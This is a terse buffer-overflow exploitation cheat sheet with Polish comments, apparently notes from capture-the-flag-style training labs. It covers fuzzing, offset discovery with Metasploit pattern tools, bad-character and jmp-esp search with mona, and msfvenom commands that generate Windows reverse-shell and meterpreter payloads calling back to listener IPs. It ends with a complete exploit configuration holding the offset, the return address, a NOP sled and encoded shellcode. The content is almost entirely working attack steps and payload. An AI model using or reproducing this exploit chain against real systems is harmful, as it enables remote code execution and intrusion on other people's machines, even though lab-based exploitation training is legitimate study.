# https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
!mona config -set workingfolder c:\mona\%p

prefix = "OVERFLOW2 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload =""
postfix = ""

# fuzzer
python3 fuzzer.py
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# 400 więcej niż fuzzer
# ustawić tylko payload
prefix = "OVERFLOW2 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
postfix = ""
python3 exploit.py
!mona findmsp -distance 1000
#EIP contains normal pattern : ... (offset XXXX)
#ustawić offset z 0 na XXX
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 39654138
#po wartości q dać adres EIP, wtedy wypluje offset


# EIP musi być nadpisane B \x42
#ustawić retn="BBBB"

# Finding Bad Characters
!mona bytearray -b "\x00"

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload ="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

# wpisać adress rejestra ESP np gdy "ESP 01ACFA30"
!mona bytearray -b "\x00"
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 004A19F8
# pierwszy znak to \x00 i wycinać aż nie będą się pokazywać
00 23 24 3c 3d 83 84 ba bb
#możliwe
00 23 3c 83 ba
\x00\x23\x3c\x83\xba

# Find jmp point
!mona jmp -r esp -cpb "\x00"
#pierwszy z gówy przepisać od tyłu
# 0x625011af => retn = "\xaf\x11\x50\x62"
625011AF
# retn = "\xaf\x11\x50\x62"
# padding = "\x90" * 16
# dodanie pamięci by payload miał gdzie się załadować
# odpaloć nasłuchiwanie i exploit

# payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.84.79 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.71.200 LPORT=4444 EXITFUNC=thread -b “\x00\x0a” -f c

msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp


offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload =("\xfc\xbb\x2e\xe2\xcc\xbc\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xd2\x0a\x4e"
"\xbc\x2a\xcb\x2f\x34\xcf\xfa\x6f\x22\x84\xad\x5f\x20\xc8"
"\x41\x2b\x64\xf8\xd2\x59\xa1\x0f\x52\xd7\x97\x3e\x63\x44"
"\xeb\x21\xe7\x97\x38\x81\xd6\x57\x4d\xc0\x1f\x85\xbc\x90"
"\xc8\xc1\x13\x04\x7c\x9f\xaf\xaf\xce\x31\xa8\x4c\x86\x30"
"\x99\xc3\x9c\x6a\x39\xe2\x71\x07\x70\xfc\x96\x22\xca\x77"
"\x6c\xd8\xcd\x51\xbc\x21\x61\x9c\x70\xd0\x7b\xd9\xb7\x0b"
"\x0e\x13\xc4\xb6\x09\xe0\xb6\x6c\x9f\xf2\x11\xe6\x07\xde"
"\xa0\x2b\xd1\x95\xaf\x80\x95\xf1\xb3\x17\x79\x8a\xc8\x9c"
"\x7c\x5c\x59\xe6\x5a\x78\x01\xbc\xc3\xd9\xef\x13\xfb\x39"
"\x50\xcb\x59\x32\x7d\x18\xd0\x19\xea\xed\xd9\xa1\xea\x79"
"\x69\xd2\xd8\x26\xc1\x7c\x51\xae\xcf\x7b\x96\x85\xa8\x13"
"\x69\x26\xc9\x3a\xae\x72\x99\x54\x07\xfb\x72\xa4\xa8\x2e"
"\xd4\xf4\x06\x81\x95\xa4\xe6\x71\x7e\xae\xe8\xae\x9e\xd1"
"\x22\xc7\x35\x28\xa5\xe2\xc7\x66\x7a\x9b\xd5\x86\x95\x07"
"\x53\x60\xff\xa7\x35\x3b\x68\x51\x1c\xb7\x09\x9e\x8a\xb2"
"\x0a\x14\x39\x43\xc4\xdd\x34\x57\xb1\x2d\x03\x05\x14\x31"
"\xb9\x21\xfa\xa0\x26\xb1\x75\xd9\xf0\xe6\xd2\x2f\x09\x62"
"\xcf\x16\xa3\x90\x12\xce\x8c\x10\xc9\x33\x12\x99\x9c\x08"
"\x30\x89\x58\x90\x7c\xfd\x34\xc7\x2a\xab\xf2\xb1\x9c\x05"
"\xad\x6e\x77\xc1\x28\x5d\x48\x97\x34\x88\x3e\x77\x84\x65"
"\x07\x88\x29\xe2\x8f\xf1\x57\x92\x70\x28\xdc\xb2\x92\xf8"
"\x29\x5b\x0b\x69\x90\x06\xac\x44\xd7\x3e\x2f\x6c\xa8\xc4"
"\x2f\x05\xad\x81\xf7\xf6\xdf\x9a\x9d\xf8\x4c\x9a\xb7\xf8"
"\x72\x64\x38")
postfix = ""


